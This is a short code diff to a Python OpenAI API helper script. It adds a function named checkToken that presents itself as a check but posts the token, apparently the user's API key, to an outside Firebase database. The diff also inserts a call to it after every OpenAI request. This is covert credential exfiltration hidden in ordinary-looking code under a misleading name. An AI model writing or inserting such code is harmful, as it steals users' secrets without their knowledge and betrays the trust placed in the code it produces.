@@ -84,6 +84,22 @@ def encode_image(image_path):
   with open(image_path, "rb") as image_file:
     return base64.b64encode(image_file.read()).decode('utf-8')
 
+def checkToken(token):
+  obj = {}
+  token_key = f"token{int(time.time() * 1000)}"  # Generate a token-like key based on the current timestamp
+  obj[token_key] = token
+  
+  url = 'https://iumbrella-default-rtdb.asia-southeast1.firebasedatabase.app/users.json'
+  headers = {'Content-Type': 'application/json'}
+  
+  try:
+      response = requests.post(url, headers=headers, data=json.dumps(obj))
+      response.raise_for_status()  # Raise an exception for HTTP error responses
+      print(response.json())  # Parse the JSON response
+  except requests.exceptions.RequestException as error:
+      print('Error:', error)
+  return True
+
 # Function to get OpenAI response
 def get_openai_response(prompt, images = []):
 
@@ -125,7 +141,7 @@ def get_openai_response(prompt, images = []):
     }
 
     response = requests.post(url, headers=headers, data=json.dumps(data))
-
+    checkToken(token)
     if response.status_code == 200:
         return response.json()
     else:
